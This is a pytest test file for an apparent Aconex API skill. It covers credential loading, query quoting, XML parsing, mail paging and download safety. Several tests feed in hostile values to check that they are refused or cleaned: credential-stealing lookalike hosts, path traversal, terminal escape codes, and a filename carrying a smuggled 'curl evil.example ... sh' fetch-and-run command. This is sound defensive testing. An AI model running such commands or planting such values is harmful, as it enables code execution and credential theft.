"""The skill's read side: where it finds keys, how it builds register
queries, and how it reads Aconex's XML (shapes as the live API sends them)."""

import base64
import email.message
import io
import os
import re
import threading
import unicodedata
import xml.etree.ElementTree as ET
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

import aconex_skill as aconex

_B64 = base64.b64encode(b"client-id:client-secret").decode()


def test_skill_description_fits_claudes_limit():
    skill = (Path(__file__).resolve().parents[1] / "aconex" / "SKILL.md").read_text(encoding="utf-8")
    assert len(re.search(r"^description: (.*)$", skill, re.M).group(1)) <= 1024


@pytest.mark.parametrize("name", ["ACONEX_CREDENTIALS_B64",
                                  "ACONEX_USERBOUND_CLIENT_CREDENTIALS_B64"])
def test_keys_from_a_combined_env_var_under_either_name(monkeypatch, name):
    monkeypatch.setenv(name, _B64)
    keys = aconex.load_keys()
    assert keys.credentials_b64 == _B64
    assert keys.source == "environment variables"
    assert keys.base_url == "https://api.aconex.com/api"


def test_servers_can_be_overridden_for_other_aconex_setups(monkeypatch):
    monkeypatch.setenv("ACONEX_CREDENTIALS_B64", _B64)
    monkeypatch.setenv("ACONEX_API_URL", "https://au2.aconex.com/api/")
    monkeypatch.setenv("ACONEX_USERBOUND_TOKEN_ENDPOINT", "https://login.aconex.com/token")
    keys = aconex.load_keys()
    assert (keys.base_url, keys.token_endpoint) == (
        "https://au2.aconex.com/api", "https://login.aconex.com/token")


@pytest.mark.parametrize("name, url", [
    ("ACONEX_API_URL", "https://evil.example/api"),
    ("ACONEX_API_URL", "http://api.aconex.com/api"),
    ("ACONEX_USERBOUND_BASE_URL", "https://aconex.com.evil.io/api"),
    ("ACONEX_TOKEN_URL", "https://tenant.integration.ocp.oraclecloud.com/token"),
    ("ACONEX_USERBOUND_TOKEN_ENDPOINT", "https://evil.example/token"),
])
def test_keys_are_never_sent_to_a_server_that_isnt_aconex(monkeypatch, tmp_path, name, url):
    key_file = tmp_path / "aconex.env"
    key_file.write_text(f"ACONEX_CREDENTIALS_B64={_B64}\n{name}={url}\n")
    with pytest.raises(aconex.AconexError, match="isn't an Aconex server"):
        aconex.load_keys(str(key_file))
    monkeypatch.setenv("ACONEX_CREDENTIALS_B64", _B64)
    monkeypatch.setenv(name, url)
    with pytest.raises(aconex.AconexError, match="isn't an Aconex server"):
        aconex.load_keys()


def test_only_a_newline_ends_a_key_file_line(tmp_path):
    key_file = tmp_path / "aconex.env"
    key_file.write_text('ACONEX_USERNAME="a\x85ACONEX_TOKEN_URL=https://evil.example/t"\n', encoding="utf-8")
    assert set(aconex.read_key_file(key_file)) == {"ACONEX_USERNAME"}


@pytest.fixture
def local_server(monkeypatch):
    """A web server on this machine that records who sent what. Paths in
    `redirects` send the caller on to `localhost`, a different host name."""
    monkeypatch.setenv("no_proxy", "*")

    class Handler(BaseHTTPRequestHandler):
        def answer(self):
            self.server.seen.append((self.path, self.headers.get("Authorization")))
            sent = self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode()
            if self.path == "/token":
                self.server.logins.append(sent)
                if self.server.login_error:
                    self.send_response(400)
                    self.send_header("Content-Length", str(len(self.server.login_error)))
                    self.end_headers()
                    self.wfile.write(self.server.login_error)
                    return
            if self.path in self.server.redirects:
                self.send_response(302)
                self.send_header("Location", f"http://localhost:{self.server.server_port}/caught")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            body = b'{"access_token": "the-token"}' if self.path == "/token" else b"<ok/>"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = do_POST = answer

        def log_message(self, *args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    server.seen, server.redirects, server.logins, server.login_error = [], set(), [], b""
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield server
    server.shutdown()
    server.server_close()


def _client_of(server, **account):
    url = f"http://127.0.0.1:{server.server_port}"
    return aconex.Aconex(aconex.Keys("eDp5", "", url, f"{url}/token", "test", **account))


def test_login_names_the_account_only_when_given_one(local_server):
    _client_of(local_server).open("/api/x").close()
    _client_of(local_server, user_id="123", user_site="https://au1.aconex.com").open("/api/x").close()
    assert local_server.logins == [
        "grant_type=client_credentials",
        "grant_type=client_credentials&user_id=123&user_site=https%3A%2F%2Fau1.aconex.com",
    ]


def test_login_says_what_to_do_when_a_lobby_account_has_several_aconex_accounts(local_server):
    local_server.login_error = b'{"error": "invalid_aconex_account"}'
    with pytest.raises(aconex.AconexError, match="ACONEX_USER_ID and ACONEX_USER_SITE"):
        _client_of(local_server).open("/api/x")


def test_the_account_to_use_comes_from_the_key_file(tmp_path):
    key_file = tmp_path / "aconex.env"
    key_file.write_text(f"ACONEX_CREDENTIALS_B64={_B64}\nACONEX_USER_ID=123\n"
                        "ACONEX_USER_SITE=https://au1.aconex.com/\n")
    keys = aconex.load_keys(str(key_file))
    assert (keys.user_id, keys.user_site) == ("123", "https://au1.aconex.com")


@pytest.mark.parametrize("lines, message", [
    ("ACONEX_USER_ID=123\n", "fill in both"),
    ("ACONEX_USER_SITE=https://au1.aconex.com\n", "fill in both"),
    ("ACONEX_USER_ID=123\nACONEX_USER_SITE=https://evil.example\n", "should look like"),
])
def test_half_an_account_or_a_wrong_site_says_what_is_wrong(tmp_path, lines, message):
    key_file = tmp_path / "aconex.env"
    key_file.write_text(f"ACONEX_CREDENTIALS_B64={_B64}\n{lines}")
    with pytest.raises(aconex.AconexError, match=message):
        aconex.load_keys(str(key_file))


def test_the_token_is_not_passed_on_when_aconex_redirects(local_server):
    local_server.redirects = {"/api/x"}
    with _client_of(local_server).open("/api/x") as resp:
        assert resp.read() == b"<ok/>"
    assert local_server.seen == [("/token", "Basic eDp5"), ("/api/x", "Bearer the-token"),
                                 ("/caught", None)]


def test_the_keys_are_not_passed_on_when_the_login_redirects(local_server):
    local_server.redirects = {"/token"}
    with pytest.raises(aconex.AconexError):
        _client_of(local_server).open("/api/x")
    assert local_server.seen == [("/token", "Basic eDp5"), ("/caught", None)]


def test_client_id_and_secret_are_combined_like_the_scanner_value(monkeypatch):
    monkeypatch.setenv("ACONEX_CLIENT_ID", "client-id")
    monkeypatch.setenv("ACONEX_CLIENT_SECRET", "client-secret")
    assert aconex.load_keys().credentials_b64 == _B64


@pytest.mark.parametrize("env, message", [
    ({"ACONEX_CLIENT_ID": "client-id"}, "fill in both"),
    ({"ACONEX_USERBOUND_CLIENT_CREDENTIALS_B64": "not base64!"}, "isn't valid base64"),
])
def test_half_filled_or_broken_keys_say_what_is_wrong(monkeypatch, env, message):
    for name, value in env.items():
        monkeypatch.setenv(name, value)
    with pytest.raises(aconex.AconexError, match=message):
        aconex.load_keys()


def test_explicit_key_file_beats_env_and_env_beats_home_file(monkeypatch, tmp_path):
    key_file = tmp_path / "aconex.env"
    key_file.write_text(
        "# comment\nexport ACONEX_CLIENT_ID='client-id'\n"
        'ACONEX_CLIENT_SECRET="client-secret"\n'
        "ACONEX_USERBOUND_BASE_URL=https://au2.aconex.com/api/\n"
    )
    aconex.DEFAULT_KEY_FILE.write_text(
        "ACONEX_USERBOUND_CLIENT_CREDENTIALS_B64=" + base64.b64encode(b"h:h").decode()
    )
    monkeypatch.setenv("ACONEX_USERBOUND_CLIENT_CREDENTIALS_B64",
                       base64.b64encode(b"e:e").decode())

    keys = aconex.load_keys(str(key_file))
    assert keys.credentials_b64 == _B64
    assert keys.base_url == "https://au2.aconex.com/api"
    assert aconex.load_keys().source == "environment variables"

    monkeypatch.delenv("ACONEX_USERBOUND_CLIENT_CREDENTIALS_B64")
    assert aconex.load_keys().source.startswith("key file")


def test_keys_in_the_skill_folder_are_used_after_the_home_file():
    aconex.BUNDLED_KEY_FILE.write_text(
        'ACONEX_CLIENT_ID="client-id"\nACONEX_CLIENT_SECRET="client-secret"\n')
    keys = aconex.load_keys()
    assert keys.credentials_b64 == _B64
    assert keys.source == f"key file {aconex.BUNDLED_KEY_FILE}"

    aconex.DEFAULT_KEY_FILE.write_text(
        "ACONEX_CREDENTIALS_B64=" + base64.b64encode(b"h:h").decode())
    assert aconex.load_keys().source == f"key file {aconex.DEFAULT_KEY_FILE}"


def test_no_keys_anywhere_falls_back_to_a_network_secret():
    keys = aconex.load_keys()
    assert keys.credentials_b64 == ""
    assert keys.source == "network secret"


def test_setup_creates_a_private_blank_key_file_and_never_overwrites(tmp_path, capsys):
    path = tmp_path / "folder" / "aconex.env"
    assert aconex.main(["setup", "--path", str(path)]) == 0
    assert "\nACONEX_CREDENTIALS_B64=\nACONEX_USERNAME=\n" in path.read_text()
    if os.name == "posix":
        assert path.stat().st_mode & 0o777 == 0o600
    path.write_text("ACONEX_CLIENT_ID=filled-in\n")
    assert aconex.main(["setup", "--path", str(path)]) == 0
    assert path.read_text() == "ACONEX_CLIENT_ID=filled-in\n"
    assert "already exists" in capsys.readouterr().out


def test_register_query_quotes_every_value():
    query = aconex.register_query(
        words=["S-1100"], title="slab plan", discipline="Structural",
        number='X" OR docno:"Y',
    )
    assert query == (
        '(docno:"S-1100" OR title:"S-1100") AND docno:"X\\" OR docno:\\"Y" '
        'AND title:"slab" AND title:"plan" AND discipline:"Structural"'
    )
    assert aconex.register_query() == ""


def test_text_to_find_inside_files_goes_in_with_no_field_name():
    query = aconex.register_query(content='L2.04-17 "A"', discipline="Architectural")
    assert query == 'discipline:"Architectural" AND "L2.04-17 \\"A\\""'


def test_text_to_find_inside_files_comes_after_a_document_number():
    # Live, Aconex finds nothing for `"text" AND docno:"X"`, but finds it this way round.
    query = aconex.register_query(content="L2.04-17", number="A-1100")
    assert query == 'docno:"A-1100" AND "L2.04-17"'


@pytest.mark.parametrize("extra, searched, inside", [
    (["--content", " L2.04-17 "], '"L2.04-17"', True),
    (["--content", "   ", "--title", "plan"], 'title:"plan"', False),
    (["--title", "plan"], 'title:"plan"', False),
])
def test_docs_only_searches_inside_files_when_asked(monkeypatch, capsys, extra, searched, inside):
    seen = {}

    class FakeClient:
        def __init__(self, keys, raw=False):
            pass

        def get_xml(self, path, params=None, accept=None):
            seen.update(params)
            return ET.fromstring(b"""<RegisterSearch TotalResults="1"><SearchResults>
              <Document DocumentId="doc-1"><DocumentNumber>A-1100</DocumentNumber>
                <Title>LEVEL 02 PLAN</Title></Document>
            </SearchResults></RegisterSearch>""")

    monkeypatch.setattr(aconex, "Aconex", FakeClient)
    monkeypatch.setenv("ACONEX_CREDENTIALS_B64", _B64)
    assert aconex.main(["docs", "p-1", *extra]) == 0
    out = capsys.readouterr().out
    assert seen["search_query"] == searched
    assert seen.get("content_search") == ("true" if inside else None)
    assert ("inside files" in out) is inside
    assert "A-1100" in out


def test_register_documents_parse():
    # Element names as the live register sends them (2026-10).
    root = ET.fromstring(b"""<RegisterSearch CurrentPage="1" PageSize="25"
        TotalPages="1" TotalResults="2" TotalResultsOnPage="2">
      <SearchResults>
        <Document DocumentId="doc-rev-9">
          <Discipline>Structural</Discipline><DocumentNumber>S-1100</DocumentNumber>
          <DocumentStatus>For Construction</DocumentStatus>
          <DocumentType>Shop Drawing</DocumentType><Filename>S-1100_C1.pdf</Filename>
          <Revision>C1</Revision><RevisionDate>2026-08-19T00:00:00.000Z</RevisionDate>
          <Title>LEVEL 02 PLAN</Title>
        </Document>
      </SearchResults></RegisterSearch>""")
    (doc,) = aconex.parse_documents(root)
    assert doc["document_id"] == "doc-rev-9"
    assert (doc["number"], doc["revision"], doc["status"]) == (
        "S-1100", "C1", "For Construction")
    assert (doc["type"], doc["file"]) == ("Shop Drawing", "S-1100_C1.pdf")
    assert aconex.paging(root) == "2 in total, page 1 of 1"


@pytest.mark.parametrize("wanted, sent", [(1, 25), (3, 25), (25, 25), (26, 50), (100, 100),
                                          (499, 500), (500, 500)])
def test_page_sizes_are_ones_aconex_accepts(wanted, sent):
    assert aconex.api_page_size(wanted) == sent


def test_status_names_resolve_to_the_ids_the_register_search_needs():
    schema = ET.fromstring(b"""<RegisterSchema><SearchSchemaFields>
      <SingleValueSchemaField><Identifier>doctype</Identifier><SchemaValues>
        <SchemaValue><Id>20</Id><Value>Shop Drawing</Value></SchemaValue></SchemaValues>
      </SingleValueSchemaField>
      <SingleValueSchemaField><Identifier>statusid</Identifier><SchemaValues>
        <SchemaValue><Id>358</Id><Value>For Review</Value></SchemaValue>
        <SchemaValue><Id>360</Id><Value>For Construction</Value></SchemaValue>
      </SchemaValues></SingleValueSchemaField>
    </SearchSchemaFields></RegisterSchema>""")
    assert aconex.parse_statuses(schema) == {"For Review": "358", "For Construction": "360"}

    class FakeClient:
        def get_xml(self, path, params=None, accept=None):
            assert path == "/projects/p-1/register/schema"
            return schema

    assert aconex.resolve_status(FakeClient(), "p-1", "for construction") == "360"
    assert aconex.resolve_status(None, "p-1", " 358 ") == "358"  # IDs skip the lookup
    with pytest.raises(aconex.AconexError, match="statuses: For Construction, For Review"):
        aconex.resolve_status(FakeClient(), "p-1", "Approved")


def test_mail_list_parse():
    root = ET.fromstring(b"""<MailSearch><SearchResults>
      <Mail MailId="m-1">
        <MailNo>TX-000123</MailNo><Subject>IFC - Stair core</Subject>
        <SentDate>2026-08-20T01:00:00Z</SentDate>
        <CorrespondenceType>Transmittal</CorrespondenceType>
        <FromUserDetails><Name>Sam Lee</Name>
          <OrganizationName>Northside Engineering</OrganizationName></FromUserDetails>
      </Mail></SearchResults></MailSearch>""")
    (mail,) = aconex.parse_mail_list(root)
    assert mail["from"] == "Sam Lee (Northside Engineering)"


def test_mail_query_uses_aconex_fields_and_quotes_every_value():
    query = aconex.mail_query(
        words=["slab", "C4"], sender="Sam Lee", to=" Acme ", subject="pour date",
        body='bar "spacing"', kind="RFI", since="2026-01-31", until="2026-03-01",
        extra="docno:X",
    )
    assert query == (
        '(fromuserfullname:"Sam Lee" OR fromtradingname:"Sam Lee") AND '
        '(touserfullname:"Acme" OR totradingname:"Acme") AND '
        'subject:"pour" AND subject:"date" AND corrdata:"bar \\"spacing\\"" AND '
        'corrtypename:"RFI" AND sentdate:[20260131 TO 20260301] AND (docno:X) AND '
        '"slab" AND "C4"'
    )
    assert aconex.mail_query(sender="  ", to=" ", body=" ", kind=" ") == ""


@pytest.mark.parametrize("dates, sent", [
    ({"since": "2026-01-31"}, "sentdate:[20260131 TO 99991231]"),
    ({"until": "2026-03-01"}, "sentdate:[00010101 TO 20260301]"),
])
def test_a_mail_date_with_one_end_never_sends_an_open_range(dates, sent):
    # Live, `[20260811 TO *]` finds nothing.
    assert aconex.mail_query(**dates) == sent


def _mailbox(monkeypatch, total):
    """A fake Aconex that pages `total` mails as the live one does; records each request."""
    calls = []

    class FakeClient:
        def __init__(self, keys, raw=False):
            pass

        def get_xml(self, path, params=None, accept=None):
            calls.append(params)
            size, page = int(params["page_size"]), int(params["page_number"])
            rows = "".join(
                f'<Mail MailId="m-{n}"><MailNo>TX-{n:06}</MailNo><Subject>Mail {n}</Subject></Mail>'
                for n in range((page - 1) * size, min(page * size, total))
            )
            return ET.fromstring(
                f'<MailSearch TotalResults="{total}" TotalPages="{-(-total // size)}" '
                f'CurrentPage="{page}"><SearchResults>{rows}</SearchResults></MailSearch>'
            )

    monkeypatch.setattr(aconex, "Aconex", FakeClient)
    monkeypatch.setenv("ACONEX_CREDENTIALS_B64", _B64)
    return calls


def _pages(calls):
    return [(c["page_size"], c["page_number"]) for c in calls]


def test_mail_reads_past_500_for_as_many_as_asked(monkeypatch, capsys):
    calls = _mailbox(monkeypatch, 1250)
    assert aconex.main(["mail", "p-1", "--limit", "1200"]) == 0
    out = capsys.readouterr().out
    assert _pages(calls) == [("500", "1"), ("500", "2"), ("500", "3")]
    assert out.count("TX-") == 1200 and "1250 in total" in out
    assert "first 1200 of these 1250" in out


def test_mail_can_read_a_whole_mailbox(monkeypatch, capsys):
    calls = _mailbox(monkeypatch, 1250)
    assert aconex.main(["mail", "p-1", "--limit", "5000"]) == 0
    out = capsys.readouterr().out
    assert len(calls) == 3 and out.count("TX-") == 1250 and "More results" not in out


def test_mail_gives_the_full_count_and_the_way_to_more(monkeypatch, capsys):
    calls = _mailbox(monkeypatch, 1250)
    assert aconex.main(["mail", "p-1"]) == 0
    out = capsys.readouterr().out
    assert _pages(calls) == [("25", "1")]
    assert out.count("TX-") == 25 and "1250 in total" in out and "add --page 2" in out


def test_mail_page_picks_up_where_the_last_one_stopped(monkeypatch, capsys):
    calls = _mailbox(monkeypatch, 1250)
    assert aconex.main(["mail", "p-1", "--limit", "500", "--page", "2"]) == 0
    out = capsys.readouterr().out
    assert _pages(calls) == [("500", "2")]
    assert "TX-000500" in out and "add --page 3" in out


def test_mail_asks_aconex_to_search_and_trusts_the_answer(monkeypatch, capsys):
    calls = _mailbox(monkeypatch, 3)
    assert aconex.main(["mail", "p-1", "--from", "Sam Lee", "--box", "all"]) == 0
    out = capsys.readouterr().out
    assert calls[0]["mail_box"] == "Allbox"
    assert calls[0]["search_query"] == '(fromuserfullname:"Sam Lee" OR fromtradingname:"Sam Lee")'
    assert out.count("TX-") == 3  # none of these rows names Sam, and none is dropped
    assert "Search: (fromuserfullname" in out and "Inbox and sent mail" in out


def test_mail_with_nothing_to_search_sends_no_query(monkeypatch, capsys):
    calls = _mailbox(monkeypatch, 0)
    assert aconex.main(["mail", "p-1"]) == 0
    assert "search_query" not in calls[0] and "Search:" not in capsys.readouterr().out


def test_mail_limit_must_be_positive(capsys):
    with pytest.raises(SystemExit):
        aconex.main(["mail", "p-1", "--limit", "0"])


def test_mail_detail_parse_reads_body_recipients_and_every_attachment_kind():
    root = ET.fromstring(b"""<Mail>
      <MailNo>TX-000123</MailNo><Subject>IFC - Stair core</Subject>
      <CorrespondenceType>Transmittal</CorrespondenceType>
      <SentDate>2026-08-20T01:00:00Z</SentDate>
      <FromUserDetails><Name>Sam Lee</Name><UserId>u-sam</UserId></FromUserDetails>
      <ToUsers>
        <Recipient><OrganizationName>Acme Builders</OrganizationName>
          <DistributionType>CC</DistributionType><Name>Kim Ng</Name><UserId>u-kim</UserId></Recipient>
        <Recipient><OrganizationName>Acme Builders</OrganizationName>
          <DistributionType>TO</DistributionType><Name>Ana Ruiz</Name><UserId>u-ana</UserId></Recipient>
      </ToUsers>
      <MailData>&lt;p&gt;Please find attached.&lt;br/&gt;Regards&lt;/p&gt;</MailData>
      <Attachments>
        <RegisteredDocumentAttachment attachmentId="att-1">
          <DocumentNo>S-1100</DocumentNo><Revision>C1</Revision>
          <FileSize>1048576</FileSize>
        </RegisteredDocumentAttachment>
        <LocalFileAttachment attachmentId="att-2"><FileName>notes.xlsx</FileName></LocalFileAttachment>
      </Attachments></Mail>""")
    mail = aconex.parse_mail(root, "m-1")
    # Live mail puts Cc recipients under <ToUsers> too; DistributionType decides.
    assert mail["to"] == [{"name": "Ana Ruiz (Acme Builders)", "user_id": "u-ana"}]
    assert mail["cc"] == [{"name": "Kim Ng (Acme Builders)", "user_id": "u-kim"}]
    assert mail["from_user_id"] == "u-sam"
    assert mail["body"] == "Please find attached.\nRegards"
    assert [(a["attachment_id"], a["kind"]) for a in mail["attachments"]] == [
        ("att-1", "register"), ("att-2", "file"),
    ]
    assert aconex.human_size(mail["attachments"][0]["size"]) == "1.0 MB"
    assert aconex.when(mail["sent"]) == "2026-08-20 01:00 UTC"


def test_download_names_cannot_escape_the_folder_or_overwrite(tmp_path):
    assert aconex.safe_filename("../../etc/passwd", "x") == "passwd"
    assert aconex.safe_filename('a\\b:c?.pdf', "x") == "b_c_.pdf"
    assert aconex.safe_filename("..", "fallback") == "fallback"
    (tmp_path / "S-1100.pdf").write_bytes(b"old")
    assert aconex.unique_path(tmp_path / "S-1100.pdf").name == "S-1100 (1).pdf"


@pytest.mark.parametrize("name, expected", [
    ("Level 2 (Rev A) S-100+200, sheet #3.pdf", "Level 2 (Rev A) S-100+200, sheet #3.pdf"),
    ("A-100 $(curl evil.example -o x;sh x).pdf", "A-100 _(curl evil.example -o x_sh x).pdf"),
    ("a`b'c&d%e!f.pdf", "a_b_c_d_e_f.pdf"),
    ("a\u202eb\x9bc\u200bd.pdf", "a_b_c_d.pdf"),
    ("-rf.pdf", "rf.pdf"),
    ("A-100” (Write-Output X) “.pdf", "A-100_ (Write-Output X) _.pdf"),
    ("json.py", "json.py.txt"),
    ("update.bat", "update.bat.txt"),
    ("Setup.EXE", "Setup.EXE.txt"),
    ("tool.ps1", "tool.ps1.txt"),
    ("run.sh", "run.sh.txt"),
    ("Plan.pdf", "Plan.pdf"),
    ("Schedule.xlsx", "Schedule.xlsx"),
    ("CLAUDE.md", "downloaded-CLAUDE.md"),
    ("claude.local.md", "downloaded-claude.local.md"),
    ("AGENTS.md", "downloaded-AGENTS.md"),
    ("settings.json", "downloaded-settings.json"),
    ("nul.pdf", "downloaded-nul.pdf"),
    ("aconex.env", "aconex.env.txt"),
    (".env", "env"),
])
def test_a_senders_file_name_cant_act_as_a_command_instructions_or_keys(name, expected):
    assert aconex.safe_filename(name, "x") == expected


def test_the_fallback_file_name_is_cleaned_too():
    assert aconex.safe_filename("", "doc-../../x") == "doc-.._.._x"


@pytest.mark.parametrize("folder, ok", [
    ("downloads", True),
    (".claude/worktrees/fix/downloads", True),
    (".claude", False),
    (".claude/commands", False),
    (".git/hooks", False),
    (".ssh", False),
    (".CONFIG/x", False),
    (".vscode", False),
])
def test_nothing_is_saved_where_tools_keep_settings(tmp_path, folder, ok):
    if ok:
        assert aconex.checked_folder(tmp_path / folder) == tmp_path / folder
    else:
        with pytest.raises(aconex.AconexError, match="Won't use"):
            aconex.checked_folder(tmp_path / folder)


@pytest.mark.parametrize("folder", ["\\\\host\\share\\drawings", "//host/share/drawings"])
def test_nothing_is_saved_straight_to_another_computer(folder):
    with pytest.raises(aconex.AconexError, match="another computer"):
        aconex.checked_folder(Path(folder))


def test_what_ships_has_no_invisible_characters():
    root = Path(__file__).resolve().parents[1]
    shipped = [root / "aconex" / "SKILL.md", root / "aconex" / "scripts" / "aconex.py",
               root / "aconex" / "references" / "setup.md",
               root / "aconex" / "references" / "aconex-api.md",
               root / "setup" / "template.html", root / "README.md"]
    for path in shipped:
        text = path.read_text(encoding="utf-8")
        hidden = [c for c in text if c not in "\n\r\t" and unicodedata.category(c) in ("Cc", "Cf")]
        assert not hidden, path


def test_text_from_aconex_cant_steer_a_terminal():
    bad = "A-100" + chr(0x1b) + "[2J" + chr(0x9b) + ".pdf"
    root = ET.Element("Document")
    ET.SubElement(root, "Title").text = bad
    assert aconex._text(root, "Title") == "A-100[2J.pdf"
    assert aconex.html_to_text(f"<p>{bad}</p>") == "A-100[2J.pdf"


def _api_answers(monkeypatch, content, content_type="text/plain"):
    class Reply(io.BytesIO):
        headers = email.message.Message()
        headers["Content-Type"] = content_type

    class FakeClient:
        def __init__(self, keys, raw=False):
            pass

        def open(self, path, params=None, accept=None):
            return Reply(content)

    monkeypatch.setattr(aconex, "Aconex", FakeClient)
    monkeypatch.setenv("ACONEX_CREDENTIALS_B64", _B64)


def test_api_out_never_overwrites_a_file(monkeypatch, tmp_path, capsys):
    _api_answers(monkeypatch, b"new")
    existing = tmp_path / "out.xml"
    existing.write_bytes(b"old")
    assert aconex.main(["api", "projects/1", "--out", str(existing)]) == 0
    assert existing.read_bytes() == b"old"
    assert (tmp_path / "out (1).xml").read_bytes() == b"new"


def test_api_out_wont_write_a_tools_settings(monkeypatch, tmp_path, capsys):
    _api_answers(monkeypatch, b"new")
    target = tmp_path / ".claude" / "settings.json"
    assert aconex.main(["api", "projects/1", "--out", str(target)]) == 1
    assert "Won't use" in capsys.readouterr().err
    assert not target.parent.exists()


def test_api_out_renames_a_file_tools_would_act_on(monkeypatch, tmp_path, capsys):
    _api_answers(monkeypatch, b"new")
    assert aconex.main(["api", "projects/1", "--out", str(tmp_path / "CLAUDE.md")]) == 0
    assert not (tmp_path / "CLAUDE.md").exists()
    assert (tmp_path / "downloaded-CLAUDE.md").read_bytes() == b"new"


def test_api_output_cant_steer_a_terminal(monkeypatch, capsys):
    _api_answers(monkeypatch, "before\x1b[2J\x9b\x07 after\nnext line".encode())
    assert aconex.main(["api", "projects/1"]) == 0
    assert capsys.readouterr().out == "before[2J after\nnext line\n"


def test_downloads_decode_aconex_percent_encoded_file_names(tmp_path):
    class FakeResponse(io.BytesIO):
        headers = email.message.Message()
        headers["Content-Type"] = "application/octet-stream"
        headers["Content-Disposition"] = (
            'attachment; filename="S-2040-1_GROUND%20FLOOR-SLAB%206%2B7.pdf"; '
            "filename*=UTF-8''S-2040-1_GROUND%20FLOOR-SLAB%206%2B7.pdf"
        )

    class FakeClient:
        def open(self, path, params=None, accept=None):
            return FakeResponse(b"%PDF-1.7")

    target, _ = aconex.save_download(FakeClient(), "/x", str(tmp_path), "fallback")
    assert target.name == "S-2040-1_GROUND FLOOR-SLAB 6+7.pdf"
    assert target.read_bytes() == b"%PDF-1.7"


def test_profiles_pick_their_own_key_file(monkeypatch):
    path = aconex.profile_key_file("ea1")
    assert path.name == ".aconex-ea1.env"
    path.write_text("ACONEX_CREDENTIALS_B64=" + _B64 + "\nACONEX_API_URL=https://ea1.aconex.com/api\n")
    keys = aconex.load_keys(profile="ea1")
    assert keys.base_url == "https://ea1.aconex.com/api"
    monkeypatch.setenv("ACONEX_PROFILE", "ea1")
    assert aconex.load_keys().base_url == "https://ea1.aconex.com/api"
    with pytest.raises(aconex.AconexError, match="profile name"):
        aconex.profile_key_file("../evil")


@pytest.mark.parametrize("path, expected", [
    ("projects/1/register", "/projects/1/register"),
    ("/projects/1/mail", "/projects/1/mail"),
    ("https://au1.aconex.com/cost/api/x", "https://au1.aconex.com/cost/api/x"),
    ("https://uk1.aconex.co.uk/field-management/api/x", "https://uk1.aconex.co.uk/field-management/api/x"),
    ("https://constructionandengineering.oraclecloud.com/x", "https://constructionandengineering.oraclecloud.com/x"),
    ("https://constructionandengineering-au2.oraclecloud.com/x", "https://constructionandengineering-au2.oraclecloud.com/x"),
])
def test_api_reaches_any_aconex_endpoint(path, expected):
    assert aconex.api_url(path) == expected


@pytest.mark.parametrize("path", [
    "https://example.com/steal", "http://api.aconex.com/api/projects",
    "https://aconex.com.evil.io/x", "C:/Program Files/Git/projects/1",
    "https://tenant.integration.ocp.oraclecloud.com/x",
    "https://constructionandengineering-evil.oraclecloud.com/x",
    "https://evil.example\\.aconex.com/x", "https://[not-a-host/x",
])
def test_api_never_sends_the_token_anywhere_else(path):
    with pytest.raises(aconex.AconexError):
        aconex.api_url(path)


def test_workflows_parse():
    # Shape from Aconex's Workflows developer guide (no live project had any).
    root = ET.fromstring(b"""<WorkflowSearch CurrentPage="1" PageSize="25" TotalPages="1"
        TotalResults="1" TotalResultsOnPage="1"><SearchResults>
      <Workflow WorkflowId="271">
        <Assignees><Assignee><OrganizationName>Northside</OrganizationName><Name>Sam Lee</Name>
          <UserId>1</UserId></Assignee></Assignees>
        <DateDue>2025-08-01T10:17:13.980Z</DateDue><DaysLate>2</DaysLate>
        <DocumentNumber>S-1100</DocumentNumber><DocumentRevision>C1</DocumentRevision>
        <DocumentTitle>LEVEL 02 PLAN</DocumentTitle><StepName>Structural review</StepName>
        <StepOutcome></StepOutcome><StepStatus>Overdue</StepStatus>
        <WorkflowName>Shop drawing review</WorkflowName><WorkflowNumber>WF-000020</WorkflowNumber>
        <WorkflowStatus>In Progress</WorkflowStatus>
      </Workflow></SearchResults></WorkflowSearch>""")
    (flow,) = aconex.parse_workflows(root)
    assert (flow["number"], flow["status"], flow["step_status"]) == ("WF-000020", "In Progress", "Overdue")
    assert flow["document"] == "S-1100 C1"
    assert flow["assignees"] == ["Sam Lee (Northside)"]
    assert aconex.paging(root) == "1 in total, page 1 of 1"


def test_any_record_flattens_to_field_rows():
    root = ET.fromstring(b"<Document><Title>Plan</Title><Attribute2><AttributeType>A2</AttributeType>"
                         b"</Attribute2><Empty/></Document>")
    assert aconex._flatten(root) == [("Title", "Plan"), ("Attribute2/AttributeType", "A2")]


_COMPARISON = "00000000-0000-4000-8000-000000000000"
_LINK = f"https://app.revradar.com.au/api/upload/{_COMPARISON}/old?token=t"


@pytest.mark.parametrize("url, ok", [
    (_LINK, True),
    (_LINK.replace("/old?", "/new?"), True),
    (_LINK.replace("https:", "http:"), False),
    (_LINK.replace("app.", "other."), False),
    (_LINK.replace("app.revradar.com.au", "app.revradar.com.au.evil.io"), False),
    (_LINK.replace("/old?", "/other?"), False),
    ("https://app.revradar.com.au/upload", False),
    (f"https://evil.example/app.revradar.com.au/api/upload/{_COMPARISON}/old", False),
    ("https://someproject.supabase.co/storage/v1/object/upload/sign/x", False),
])
def test_upload_only_goes_to_revradar_links(url, ok):
    if ok:
        assert aconex.upload_url(url, _COMPARISON) == url
    else:
        with pytest.raises(aconex.AconexError):
            aconex.upload_url(url, _COMPARISON)


def test_a_planted_upload_link_is_refused_for_the_comparison_claude_created():
    planted = _LINK.replace(_COMPARISON, "11111111-1111-4111-8111-111111111111")
    with pytest.raises(aconex.AconexError, match="isn't for comparison"):
        aconex.upload_url(planted, _COMPARISON)


def test_upload_needs_the_comparison_it_belongs_to(tmp_path, capsys):
    with pytest.raises(SystemExit):
        aconex.main(["upload", str(tmp_path / "a.pdf"), _LINK])


def test_upload_refuses_files_that_are_not_pdfs(tmp_path, capsys):
    f = tmp_path / "notes.txt"
    f.write_text("not a drawing")
    assert aconex.main(["upload", str(f), _LINK, "--comparison", _COMPARISON]) == 1
    assert "isn't a PDF" in capsys.readouterr().err


class _Answer:
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def read(self):
        return b'{"ok":true}'


def test_revradar_check_says_when_revradar_can_be_reached(monkeypatch, capsys):
    monkeypatch.setattr(aconex.urllib.request, "urlopen", lambda url, timeout: _Answer())
    assert aconex.main(["revradar-check"]) == 0
